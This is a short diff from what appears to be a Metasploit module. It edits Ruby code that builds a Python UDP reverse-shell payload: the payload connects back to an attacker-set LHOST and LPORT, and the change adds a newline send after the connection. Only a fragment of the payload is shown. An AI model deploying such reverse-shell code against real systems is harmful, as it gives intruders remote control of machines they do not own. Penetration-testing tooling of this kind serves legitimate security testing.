@@ -50,6 +50,7 @@ module MetasploitModule
     cmd << "import socket,os\n"
     cmd << "so=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\n"
     cmd << "so.connect(('#{datastore['LHOST']}',#{ datastore['LPORT']}))\n"
+    cmd << "so.send('\\n')\n"
     # The actual IO
     cmd << "#{dead}=False\n"
     cmd << "while not #{dead}:\n"
